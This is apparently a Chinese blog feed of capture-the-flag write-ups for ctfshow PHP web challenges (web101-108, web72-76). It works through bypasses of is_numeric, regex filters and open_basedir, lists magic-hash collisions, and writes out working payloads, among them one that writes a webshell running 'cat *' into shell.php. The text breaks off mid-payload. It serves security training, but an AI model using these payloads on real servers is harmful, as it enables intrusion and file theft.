这些类使得PHP代码能够获取关于类、接口、函数、方法和扩展的信息, 并在运行时动态调用它们; 常见的反射类有:</p><ul><li>ReflectionClass: 用于检查类, 可以获取类的名称、父类、接口、方法、属性等信息</li><li>ReflectionMethod: 用于检查类的方法，可以获取方法的名称、参数、访问级别等信息，并可以调用该方法</li><li>ReflectionProperty: 用于检查类的属性，可以获取属性的名称、访问级别等信息，并可以读取或设置属性值</li><li>ReflectionFunction: 用于检查函数，包括内置函数和用户定义的函数</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 示例</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$publicProperty</span> = <span class="string">&#x27;Public&#x27;</span>;  </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$protectedProperty</span> = <span class="string">&#x27;Protected&#x27;</span>;  </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$privateProperty</span> = <span class="string">&#x27;Private&#x27;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">myPublicMethod</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Public method&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">myProtectedMethod</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Protected method&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">myPrivateMethod</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Private method&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$reflectionClass</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;MyClass&#x27;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 获取类的属性  </span></span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$reflectionClass</span>-&gt;<span class="title function_ invoke__">getProperties</span>();  </span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$properties</span> <span class="keyword">as</span> <span class="variable">$property</span>) &#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$property</span>-&gt;<span class="title function_ invoke__">getName</span>() . <span class="string">&quot;\n&quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 调用公共方法  </span></span><br><span class="line"><span class="variable">$instance</span> = <span class="variable">$reflectionClass</span>-&gt;<span class="title function_ invoke__">newInstance</span>();  </span><br><span class="line"><span class="variable">$method</span> = <span class="variable">$reflectionClass</span>-&gt;<span class="title function_ invoke__">getMethod</span>(<span class="string">&#x27;myPublicMethod&#x27;</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$method</span>-&gt;<span class="title function_ invoke__">invoke</span>(<span class="variable">$instance</span>) . <span class="string">&quot;\n&quot;</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 尝试调用受保护或私有方法（这通常不是一个好的做法，除非有特别需要）  </span></span><br><span class="line"><span class="variable">$protectedMethod</span> = <span class="variable">$reflectionClass</span>-&gt;<span class="title function_ invoke__">getMethod</span>(<span class="string">&#x27;myProtectedMethod&#x27;</span>);  </span><br><span class="line"><span class="variable">$protectedMethod</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>); <span class="comment">// 设置为可访问  </span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$protectedMethod</span>-&gt;<span class="title function_ invoke__">invoke</span>(<span class="variable">$instance</span>) . <span class="string">&quot;\n&quot;</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 类似地，可以调用私有方法  </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>而<code>var_dump()</code>是一个PHP函数,用于输出变量的详细信息; 当您使用<code>var_dump()</code>打印一个变量时, 它会显示变量的类型和值; 如果变量是一个数组或对象, <code>var_dump()</code>还会递归地显示数组的元素或对象的属性, 以及这些元素的类型</p><p><code>print_r</code>和<code>var_export</code>都是输出内容的函数</p><blockquote><p>反射类(Reflection Classes)是PHP反射API的一部分, <code>var_dump()</code>是一个 PHP 函数</p></blockquote><h2 id="web101"><a class="header-anchor" href="#web101">¶</a>web101</h2><ul><li>描述: 修补100题非预期,替换0x2d</li><li>提示: 最后一位需要爆破16次，题目给的flag少一位</li></ul><p>这里的非预期指的是<code>var_dump()</code>和执行一句话马的两个解法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反射类还是可以用的(flag是变量名):</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure><p>但是你说的对, 第二种解法是序列化:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v2=echo(serialize(new%20ctfshow&amp;v3=));</span><br></pre></td></tr></table></figure><h2 id="web102"><a class="header-anchor" href="#web102">¶</a>web102</h2><ul><li>描述: 换个姿势</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断v2和v3是否都是数字(仅生效v2), 在v2中截取从第三个字符开始的子字符串赋值给s, 将s作为参数传入v1指定的函数, 将函数的返回值赋给变量str; 最后将str的返回值写入到以v3命名的文件中</p><p><code>call_user_func</code> 是 PHP 中的一个函数，它允许你调用一个回调函数，并且动态地将参数传递给该回调函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunction</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello, &quot;</span> . <span class="variable">$name</span> . <span class="string">&quot;!&quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&quot;myFunction&quot;</span>, <span class="string">&quot;World&quot;</span>);  </span><br><span class="line"><span class="comment">// 输出: Hello, World!</span></span><br></pre></td></tr></table></figure><p><code>file_put_contents</code>作为文件包含利用点刚在web87见过, 第一个参数是文件名，第二个参数是需要写进文件中的内容, 文件名支持伪协议</p><p>所以v1要是一个函数, v2是一个纯数字组成的字符串, v3是一个文件名或用伪协议(我用伪协议)</p><p>利用hex2bin可以将16进制转换为ascii码, 所以v1=hex2bin; v3伪协议, 所以v3=php://filter/write=convert.base64-decode/resource=shell.php</p><p>v2就是将一句话木马进行base64编码后再进行十六进制编码, 注意<code>substr</code>的字符截取从0开始</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原: &lt;?=`cat *`;</span><br><span class="line">base64: PD89YGNhdCAqYDs=# 如果出现=是可以去掉的, 填充不影响加解密</span><br><span class="line">hex(None): 5044383959474e6864434171594473</span><br></pre></td></tr></table></figure><blockquote><p>e会被当作科学记数法的标志, 所以这个字符串依然是数字</p></blockquote><p>所以payload如下, 让问shell.php即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET: v2=005044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=shell.php</span><br><span class="line">POST: v1=hex2bin</span><br></pre></td></tr></table></figure><p>如果是PHP5,则可以不用伪协议; payload如下:</p><blockquote><p>php5中is_numeric函数识别16进制数，而php7不识别16进制数</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v2=003c3f3d636174202a3b&amp;v3=1.php</span><br><span class="line">post:v1=hex2bin</span><br></pre></td></tr></table></figure><h2 id="web103"><a class="header-anchor" href="#web103">¶</a>web103</h2><ul><li>描述: 换个姿势</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*p.*h.*p.*/i&quot;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sorry&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上题的基础上给v2加了一层过滤, 用于过滤在任何位置出现的.php, v2参数路径如下:</p><p>hex -&gt; substr()+call_user_func() -&gt; base64 -&gt; preg_match() -&gt; file_put_contents()</p><p>不过很显然, base64加密后不存在.php这种东西, 所以继续用上一题payload即可</p><h2 id="web104"><a class="header-anchor" href="#web104">¶</a>web104</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你认为是sha1碰撞, 但是明显没有判断是否相等, 传入相同的东西给v1和v2就可以了</p><p>或者sha1和md5一样不能处理数组, 那就传入数组即可</p><p>还有0e绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5：</span><br><span class="line">240610708:0e462097431906509019562988736854</span><br><span class="line">QLTHNDT:0e405967825401955372549139051580</span><br><span class="line">QNKCDZO:0e830400451993494058024219903391</span><br><span class="line">PJNPDWY:0e291529052894702774557631701704</span><br><span class="line">NWWKITQ:0e763082070976038347657360817689</span><br><span class="line">NOOPCJF:0e818888003657176127862245791911</span><br><span class="line">MMHUWUV:0e701732711630150438129209816536</span><br><span class="line">MAUXXQC:0e478478466848439040434801845361</span><br><span class="line"> </span><br><span class="line">sha1：</span><br><span class="line">10932435112: 0e07766915004133176347055865026311692244</span><br><span class="line">aaroZmOk: 0e66507019969427134894567494305185566735</span><br><span class="line">aaK1STfY: 0e76658526655756207688271159624026011393</span><br><span class="line">aaO8zKZF: 0e89257456677279068558073954252716165668</span><br><span class="line">aa3OFF9m: 0e36977786278517984959260394024281014729</span><br><span class="line">0e1290633704: 0e19985187802402577070739524195726831799</span><br></pre></td></tr></table></figure><h2 id="web105"><a class="header-anchor" href="#web105">¶</a>web105</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br></pre></td></tr></table></figure><p>php的变量覆盖, 直接将用户输入用作变量名, 可能导致变量覆盖问题</p><p>检查GET传参key不等于error的时候执行<code>$$key=$$value</code>, 意为&quot;一个变量其名称由<code>$key</code>的值决定&quot;, value同理; 检查POST传参value不等于flag的时候执行相同操作, 最后检查传入的flag是都等于<code>$flag</code>, 如果是, 输出flag</p><p>因为变量覆盖可以是任意的, 可以利用判定失败中的<code>die($error)</code>, 利用这一点输出flag, payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET: ?suces=flag </span><br><span class="line">POST: error=suces</span><br><span class="line"># 或</span><br><span class="line">GET: ?1=flag </span><br><span class="line">POST: error=1</span><br></pre></td></tr></table></figure><p>也可以用<code>die($suces)</code>, 将<code>$flag</code>赋值给<code>$suces</code>, 然后赋值<code>$flag</code>为空即可满足<code>$_POST['flag']==$flag</code> payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET: ?suces=flag&amp;flag=</span><br><span class="line"># 或</span><br><span class="line">GET: ?suces=flag</span><br><span class="line">POST: flag=</span><br></pre></td></tr></table></figure><h2 id="web106"><a class="header-anchor" href="#web106">¶</a>web106</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>) &amp;&amp; <span class="variable">$v1</span>!=<span class="variable">$v2</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断加回来了, 那就用数组和0e绕过就行了</p><h2 id="web107"><a class="header-anchor" href="#web107">¶</a>web107</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       <span class="title function_ invoke__">parse_str</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="title function_ invoke__">md5</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>parse_str</code>函数将字符串<code>$v1</code>解析为变量并存储到数组<code>$v2</code>中, 从解析后的数组<code>$v2</code>中获取的flag参数值, 检查该参数是否等于<code>$v3</code>经过md5加密的值, 满足条件输出flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="string">&quot;name=John&amp;age=30&quot;</span>, <span class="variable">$output</span>);  </span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$output</span>);</span><br></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Array ( [name] =&gt; John [age] =&gt; 30 )</span><br></pre></td></tr></table></figure><p>本题完全不用绕过乱七八糟的东西, payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET: ?v3=240610708 </span><br><span class="line">POST: v1=flag=0</span><br></pre></td></tr></table></figure><h2 id="web108"><a class="header-anchor" href="#web108">¶</a>web108</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>ereg</code>函数与<code>preg_match</code>都是正则, 在PHP 5.3.0后已被废弃, 且不支持强比较(但是本题确实有用)</p></blockquote><p>用正则判断参数c中是否包含大小写字母, 为否则结束程序; 然后用 <code>strrev</code> 反转参数 <code>c</code> 的值, 然后使用 <code>intval</code> 将结果转换为整数, 并与十六进制数 <code>0x36d</code>(十进制为877)进行比较; 这意味着, 为了通过这个检查, 用户需要提供一个字符串, 该字符串反转后的整数表示必须等于877, 但是显然没有这样的字符串</p><p>那么只能绕过<code>ereg</code>函数, 随便一搜就能看到有%00截断漏洞</p><blockquote><p><code>ereg</code>函数用指定的模式搜索一个字符串中指定的字符串, 如果匹配成功返回true, 否则返回false; 搜索字母的字符是大小写敏感的</p></blockquote><p>所以payload为:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=a%00778</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕过 </tag>
            
            <tag> RCE </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web入门-命令执行-3</title>
      <link href="/article/ctfshow-webbasic-rce-3/"/>
      <url>/article/ctfshow-webbasic-rce-3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>命令执行</h1><hr><blockquote><p>从这里开始就像是打ctf的情况了, 前置是一点不会, 全靠在网上找原理找相似题目, 我的建议是做好心理准备</p></blockquote><h2 id="web72"><a class="header-anchor" href="#web72">¶</a>web72</h2><ul><li>描述: 命令执行，突破禁用函数，求你们别秀了</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br></pre></td></tr></table></figure><p>压根没有变?可是我的flag呢?我的flag哪里去了?</p><p>偷偷你的web71, 你尝试访问根目录的时候会发现<code>Operation not permitted</code>, 权限也没了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=var_export(scandir(&quot;./&quot;));exit();</span><br></pre></td></tr></table></figure><p>本题设置了<code>open_basedir()</code>, 以及限制了<code>ini_set()</code>, 现在是将php所能打开的文件限制在指定的目录树中(指定为<code>/var/www/html</code>), 包括文件本身; 而且还不能通过<code>ini_set()</code>重新设置这个属性(<a href="https://www.freesion.com/article/5349629378/">对应博客</a>)</p><p>解决这个问题给到的payload是:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;); foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125; exit(0);?&gt;</span><br></pre></td></tr></table></figure><p>我不是很懂这个怎么来的</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 详解: </span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);  </span><br><span class="line"><span class="comment"># 利用DirectoryIterator($path)可以实现遍历目录下的所有文件</span></span><br><span class="line"><span class="comment"># glob:// — 查找匹配的文件路径模式</span></span><br><span class="line"><span class="comment"># DirectoryIterator(&quot;glob:///*&quot;)   遍历根目录里所有文件</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)  <span class="comment">#循环遍历输出，并以空格为分隔</span></span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>eval()里的语句可以视为在当前php文件里加了几条语句, 这些语句必须是完整的, 即必须以&quot;;“, 或者”?&gt;“结尾来结束语句, 但是eval里的”?&gt;&quot;不会闭合当前php文件</p></blockquote><p>ctfshow提供的这道题的poc(一个绕过安全目录的脚本): 说是利用了php的垃圾回收,我这里干脆就贴别人写的<a href="https://blog.csdn.net/m0_48780534/article/details/125095560">文章</a>得了,我看不懂这段代码原理</p><h2 id="web73"><a class="header-anchor" href="#web73">¶</a>web73</h2><ul><li>描述: 同上</li></ul><p>没给源码, 但是看报错应该是差不多的, 也是<code>open_basedir()</code>, 以及限制了<code>ini_set()</code></p><p>可是却可以直接执行以下代码获取根目录文件, 那看来是形同虚设</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=var_export(scandir(&quot;/&quot;));exit();</span><br></pre></td></tr></table></figure><p>直接尝试包含本题的flag: flagc.txt, 成功执行拿到flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include(&#x27;/flagc.txt&#x27;);exit();</span><br></pre></td></tr></table></figure><h2 id="web74"><a class="header-anchor" href="#web74">¶</a>web74</h2><ul><li>描述: 同上</li></ul><p>也没给源码, 报错也一样, 那我们继续试之前的payload, 结果发现不能用了, 测试发现是因为<code>scandir()</code>被限制了</p><p>那就用web72提供的代码好了, 可以得到本次的flag是flagx.txt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;); foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125; exit(0);?&gt;</span><br></pre></td></tr></table></figure><p>直接尝试进行include, 发现可以执行, 那就拿到了flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include(&#x27;/flagx.txt&#x27;);exit();</span><br></pre></td></tr></table></figure><h2 id="web75-76"><a class="header-anchor" href="#web75-76">¶</a>web75-76</h2><ul><li>描述: 同上</li></ul><p>帮你试过了, 还是得用上面web72的脚本, 本次的flag叫做flag36.txt; 但是<code>open_basedir</code>给你整麻了, 不能include了</p><p>然后web72的那个脚本也不行了, 不清楚原因, 只能求助于wp:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=try 